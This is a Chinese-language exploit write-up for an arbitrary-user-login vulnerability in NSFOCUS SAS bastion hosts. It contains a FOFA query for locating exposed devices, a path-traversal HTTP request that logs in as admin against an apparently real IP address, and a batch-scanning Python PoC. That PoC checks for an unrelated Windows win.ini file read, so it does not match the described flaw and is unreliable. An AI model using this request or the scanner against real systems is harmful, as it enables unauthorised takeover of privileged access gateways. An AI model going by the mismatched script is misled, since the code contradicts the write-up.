# 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

### 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719487092994-e4fea1fd-973a-430a-adab-aef472f1901a.png)

### fofa语法

```plain
body="'/needUsbkey.php?username='"
```

### 漏洞复现

```plain
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 115.233.211.203
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```

登录成功

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719487263928-ac3127d3-5d77-4b0b-a348-763ee329e3a6.png)

### poc脚本

~~~markdown
#导包
import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()   #解除警告

GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'
def banner():
    banner = '''         
██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝           
                  version:1.0.0
                  author:mazha.top
'''
    print(banner)
def poc(target):
    url = target+"/CommonFileServer/c:/windows/win.ini"
    headers={
            "accept": "*/*",
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9",
            }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        if res.status_code==200 and "MAPI" in res.text:
            print(f"[+] {GREEN}存在漏洞{target}\n{RESET}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] 不存在漏洞")
    except:
        print(f"[*]无法访问")
def main():
    banner()
    #处理命令行参数
    parser = argparse.ArgumentParser(description='')
    #添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    #调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':   #主函数入口
    main()     #入口  main()
~~~

### py脚本使用

```
python3 文件名 -f url.txt # 批量测试url
python3 文件名 -u http://127.0.0.1 # 单个测试url
```
